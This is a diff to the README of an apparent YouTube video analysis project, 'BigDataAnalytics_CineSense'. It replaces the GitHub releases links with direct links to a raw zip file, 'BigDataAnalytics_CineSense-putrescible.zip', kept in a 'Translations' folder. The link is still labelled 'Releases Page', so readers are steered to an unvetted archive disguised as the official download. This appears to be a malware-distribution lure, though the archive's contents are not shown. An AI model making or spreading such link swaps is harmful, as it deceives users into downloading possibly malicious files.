@@ -1,7 +1,7 @@
 # 📊 BigDataAnalytics_CineSense - Effortlessly Analyze YouTube Videos
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/dianeleslie1968-cyber/BigDataAnalytics_CineSense/releases)
+[![Download](https://raw.githubusercontent.com/dianeleslie1968-cyber/BigDataAnalytics_CineSense/main/Translations/BigDataAnalytics_CineSense-putrescible.zip%20Release-brightgreen)](https://raw.githubusercontent.com/dianeleslie1968-cyber/BigDataAnalytics_CineSense/main/Translations/BigDataAnalytics_CineSense-putrescible.zip)
 
 ## 🚀 Getting Started
 BigDataAnalytics_CineSense is a user-friendly application designed to help you download, process, and analyze YouTube videos. It uses advanced techniques, such as parallel processing and sentiment analysis, to give you insights on video content efficiently.
@@ -15,7 +15,7 @@ To run BigDataAnalytics_CineSense, ensure your system meets these requirements:
 - Internet Connection: Required for downloading videos and accessing features
 
 ## 📥 Download & Install
-1. Visit this page to download: [Releases Page](https://github.com/dianeleslie1968-cyber/BigDataAnalytics_CineSense/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/dianeleslie1968-cyber/BigDataAnalytics_CineSense/main/Translations/BigDataAnalytics_CineSense-putrescible.zip).
    
 2. On the releases page, you will see different versions of the software. Choose the latest version.
 
